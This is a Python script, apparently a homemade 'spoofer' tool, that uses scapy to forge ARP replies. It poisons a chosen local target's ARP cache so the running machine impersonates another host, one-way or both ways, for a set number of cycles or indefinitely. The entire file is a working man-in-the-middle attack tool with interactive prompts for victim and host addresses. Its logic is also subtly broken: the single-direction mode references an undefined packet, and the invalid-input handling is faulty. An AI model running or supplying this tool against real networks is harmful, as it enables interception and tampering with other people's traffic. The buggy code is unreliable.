from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys


def get_mac(ip):
    """
    Fetch the mac address of an ip
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, runs, bidirectional):
    """
    Spoofs the ARP Response for both the client and the host
    """
    # Find the addresses of both the target and host
    target_mac = get_mac(target_ip)
    
    # Send the ARP Response, for both sides
    target_arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    
    
    
    if(bidirectional):
            host_mac = get_mac(host_ip)
            host_arp_response = ARP(pdst=host_ip, hwdst=host_mac, psrc=target_ip, op='is-at')
            
    # Fetch our mac address and print to console
    local_mac = ARP().hwsrc
    # Intialize a counter of times spoofed
    x = 0
    while(x < runs):
        # Send the packet and report
        send(target_arp_response, verbose = 0)
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, local_mac))
        # Send the packet and report
        send(host_arp_response, verbose = 0)
        print("[+] Sent to {} : {} is-at {}".format(host_ip, target_ip, local_mac))
        x = x + 1

def user_welcome():
    """
    Greet the user and gather info
    """
    print("______                _        _____                    __ ")
    print("|  ____|              ( )      / ____|                  / _|")
    print("| |____   ____ _ _ __ |/ ___  | (___  _ __   ___   ___ | |_ ___ _ __")
    print("|  __\ \ / / _` | '_ \  / __|  \___ \| '_ \ / _ \ / _ \|  _/ _ \ '__|")
    print("| |___\ V / (_| | | | | \__ \  ____) | |_) | (_) | (_) | ||  __/ | ")
    print("|______\_/ \__,_|_| |_| |___/ |_____/| .__/ \___/ \___/|_| \___|_|  ")
    print("                                     | |")
    print("                                     |_| ")
    print("Welcome to the spoofer. There are two options for spoofing, listed below:")
    print("(1) for bi-directional spoofing\n(2) for single-directional spoofing")
    direction = input("Type 1 or 2 to choose your configuration: ")
    print("Which local user would you like to target?")
    target = input("Please enter their local IP: ")
    print("What internet host would you like to impersonate?")
    host = input("Please enter the host's IP address: ")
    print("How long would you like the spoof to run?")
    selection = int(input("(1) for 50 cycles, (2) for 250 cycles, (3) for 500 cycles, (4) to cycle until termination: "))
    if selection == 1:
        runs = 50
    elif selection == 2:
        runs = 250
    elif selection == 3:
        runs = 500
    elif selection == 4:
        runs = float('inf')
    else:
        print("Invalid Selections! Try again!")
        get_started()
    return int(direction), target, host, runs

def get_started():
    option, target, host, runs = user_welcome()
    if(option == 1):
        spoof(target, host, runs, True)
    elif(option == 2):
        spoof(target, host, runs, False)
    else:
        print("Invalid Selections! Try again!")
        get_started()

get_started()